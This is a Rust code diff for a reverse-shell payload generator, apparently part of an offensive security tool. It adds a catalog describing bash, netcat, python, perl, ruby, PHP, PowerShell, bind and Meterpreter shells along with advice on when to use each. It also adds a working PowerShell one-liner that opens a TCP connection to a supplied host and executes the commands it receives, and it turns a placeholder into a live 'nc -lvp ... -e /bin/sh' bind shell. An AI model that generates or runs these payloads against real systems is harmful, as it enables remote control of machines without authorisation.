@@ -35,9 +35,115 @@ impl fmt::Display for ShellType {
             Self::ReversePhp => write!(f, "Reverse PHP Shell"),
             Self::ReverseNetcat => write!(f, "Reverse Netcat Shell"),
             Self::MeterpreterReverseTcp => write!(f, "Meterpreter Reverse TCP"),
-            Self::PowerShellMsf => write!(f, "PowerShell Msfvenom Stage"),
+            Self::PowerShellMsf => write!(f, "PowerShell Reverse Shell"),
         }
     }
+}
+
+impl ShellType {
+    /// Every shell type with its CLI aliases, target platform, and a
+    /// plain-language description — the single source of truth behind both
+    /// `--gen-shell --list` and the `--guide` output.
+    #[must_use]
+    pub const fn catalog() -> &'static [ShellTypeEntry] {
+        &[
+            ShellTypeEntry {
+                shell_type: ShellType::ReverseBash,
+                aliases: &["bash", "sh"],
+                platform: "Linux / Unix",
+                description: "One-line bash reverse shell using /dev/tcp. Best when bash is present (almost always on Linux).",
+            },
+            ShellTypeEntry {
+                shell_type: ShellType::ReverseNetcat,
+                aliases: &["netcat", "nc"],
+                platform: "Linux / Unix (nc with -e support or ncat)",
+                description: "Reverse shell via netcat + named pipe. Reliable on many distros, but some nc builds lack -e.",
+            },
+            ShellTypeEntry {
+                shell_type: ShellType::ReversePython,
+                aliases: &["python", "python3", "py"],
+                platform: "Linux / Unix / Windows (with python3)",
+                description: "Reverse shell via python3's socket + os.dup2. Broad compatibility; often present on modern systems.",
+            },
+            ShellTypeEntry {
+                shell_type: ShellType::ReversePerl,
+                aliases: &["perl"],
+                platform: "Linux / Unix",
+                description: "Reverse shell via perl's Socket module. Useful when perl is present but bash is restricted.",
+            },
+            ShellTypeEntry {
+                shell_type: ShellType::ReverseRuby,
+                aliases: &["ruby"],
+                platform: "Linux / Unix",
+                description: "Reverse shell via ruby -rsocket. Handy on systems with a Ruby toolchain installed.",
+            },
+            ShellTypeEntry {
+                shell_type: ShellType::ReversePhp,
+                aliases: &["php"],
+                platform: "Linux / Unix (php-cli)",
+                description: "Reverse shell via php's fsockopen. Good on web hosts that ship php-cli.",
+            },
+            ShellTypeEntry {
+                shell_type: ShellType::ReverseTcp,
+                aliases: &["tcp"],
+                platform: "Linux x86_64",
+                description: "Raw x86_64 reverse TCP shellcode (syscall-based). Use where a compiled stub is preferred.",
+            },
+            ShellTypeEntry {
+                shell_type: ShellType::PowerShellMsf,
+                aliases: &["powershell", "ps", "ps1"],
+                platform: "Windows (PowerShell 2.0+)",
+                description: "One-liner PowerShell reverse shell (plain TCP client + process launch). No external tools required.",
+            },
+            ShellTypeEntry {
+                shell_type: ShellType::BindTcp,
+                aliases: &["bind", "bindtcp"],
+                platform: "Linux / Unix (nc with -e support or ncat)",
+                description: "Bind shell: the target listens and you connect to it. Only works when you can reach the target directly.",
+            },
+            ShellTypeEntry {
+                shell_type: ShellType::MeterpreterReverseTcp,
+                aliases: &["meterpreter", "msf"],
+                platform: "Windows / Linux (requires Metasploit)",
+                description: "Meterpreter reverse TCP stage. Requires the local msfvenom binary — prints the exact command.",
+            },
+            ShellTypeEntry {
+                shell_type: ShellType::ReverseHttp,
+                aliases: &["http"],
+                platform: "Windows / Linux (requires Metasploit)",
+                description: "Meterpreter reverse HTTP stager. Requires the local msfvenom binary — prints the exact command.",
+            },
+            ShellTypeEntry {
+                shell_type: ShellType::ReverseHttps,
+                aliases: &["https"],
+                platform: "Windows / Linux (requires Metasploit)",
+                description: "Meterpreter reverse HTTPS stager. Requires the local msfvenom binary — prints the exact command.",
+            },
+        ]
+    }
+
+    /// Resolve a user-supplied type name (e.g. `"bash"`, `"py"`) to a
+    /// [`ShellType`], or `None` when the name matches no alias.
+    #[must_use]
+    pub fn parse(name: &str) -> Option<ShellType> {
+        let normalized = name.trim().to_ascii_lowercase();
+        ShellType::catalog()
+            .iter()
+            .find(|entry| entry.aliases.iter().any(|alias| *alias == normalized))
+            .map(|entry| entry.shell_type)
+    }
+}
+
+/// One entry in the shell-type catalog (see [`ShellType::catalog`]).
+#[derive(Debug, Clone, Copy)]
+pub struct ShellTypeEntry {
+    pub shell_type: ShellType,
+    /// CLI aliases accepted by `--gen-shell <type>` (first is canonical).
+    pub aliases: &'static [&'static str],
+    /// Target platform the payload is intended for.
+    pub platform: &'static str,
+    /// Plain-language description of the payload and when to use it.
+    pub description: &'static str,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -131,13 +237,25 @@ exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                 "[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -f exe]"
             )
         }
-        ShellType::MeterpreterReverseTcp | ShellType::PowerShellMsf => {
+        ShellType::MeterpreterReverseTcp => {
             format!(
                 "[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f ps1]"
             )
         }
+        ShellType::PowerShellMsf => {
+            // Real, dependency-free PowerShell reverse shell (PS 2.0+).
+            // Uses the built-in TcpClient + ProcessStartInfo: no DownloadString,
+            // no IEX, no external binaries — just a socket and a spawned process.
+            format!(
+                "$c=New-Object Net.Sockets.TcpClient('{lhost}',{lport});$s=$c.GetStream();\
+                 [byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0)\
+                 {{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);\
+                 try{{$o=iex $d 2>&1|Out-String}}catch{{$o=$_.Exception.Message}}\
+                 ;$s.Write((New-Object Text.ASCIIEncoding).GetBytes($o),0,$o.Length)}}"
+            )
+        }
         ShellType::BindTcp => {
-            format!("[Bind shell: nc -lvp {lport} -e /bin/sh]")
+            format!("nc -lvp {lport} -e /bin/sh")
         }
     };
 
@@ -491,6 +609,60 @@ mod tests {
         assert_eq!(payload.lhost, "10.0.0.1");
         assert_eq!(payload.lport, 4444);
         assert!(payload.payload.contains("10.0.0.1"));
+    }
+
+    #[test]
+    fn test_generate_powershell_reverse() {
+        let payload = generate_reverse_shell(ShellType::PowerShellMsf, "10.0.0.1", 4444);
+        assert!(payload.payload.contains("TcpClient"));
+        assert!(payload.payload.contains("10.0.0.1"));
+        assert!(payload.payload.contains("4444"));
+        assert!(!payload.payload.contains("msfvenom"));
+    }
+
+    #[test]
+    fn test_generate_bind_tcp() {
+        let payload = generate_reverse_shell(ShellType::BindTcp, "10.0.0.1", 4444);
+        assert!(payload.payload.contains("nc -lvp 4444"));
+    }
+
+    #[test]
+    fn test_shell_type_parse_aliases() {
+        assert_eq!(ShellType::parse("bash"), Some(ShellType::ReverseBash));
+        assert_eq!(ShellType::parse("sh"), Some(ShellType::ReverseBash));
+        assert_eq!(ShellType::parse("python3"), Some(ShellType::ReversePython));
+        assert_eq!(ShellType::parse("nc"), Some(ShellType::ReverseNetcat));
+        assert_eq!(ShellType::parse("powershell"), Some(ShellType::PowerShellMsf));
+        assert_eq!(ShellType::parse("bind"), Some(ShellType::BindTcp));
+        assert_eq!(ShellType::parse("meterpreter"), Some(ShellType::MeterpreterReverseTcp));
+        assert_eq!(ShellType::parse("http"), Some(ShellType::ReverseHttp));
+        assert_eq!(ShellType::parse("https"), Some(ShellType::ReverseHttps));
+        assert_eq!(ShellType::parse("BASH"), Some(ShellType::ReverseBash));
+        assert_eq!(ShellType::parse("nope-not-a-shell"), None);
+    }
+
+    #[test]
+    fn test_shell_type_catalog_has_all_variants() {
+        let mut seen: Vec<ShellType> = ShellType::catalog()
+            .iter()
+            .map(|entry| entry.shell_type)
+            .collect();
+        assert_eq!(seen.len(), 12, "every ShellType variant must be cataloged");
+        seen.sort_by_key(|st| format!("{st:?}"));
+        seen.dedup();
+        assert_eq!(seen.len(), 12, "catalog must not repeat variants");
+    }
+
+    #[test]
+    fn test_shell_type_catalog_entries_are_complete() {
+        for entry in ShellType::catalog() {
+            assert!(!entry.aliases.is_empty(), "each entry needs aliases");
+            assert!(!entry.platform.is_empty(), "each entry needs a platform");
+            assert!(
+                !entry.description.is_empty(),
+                "each entry needs a description"
+            );
+        }
     }
 
     #[test]
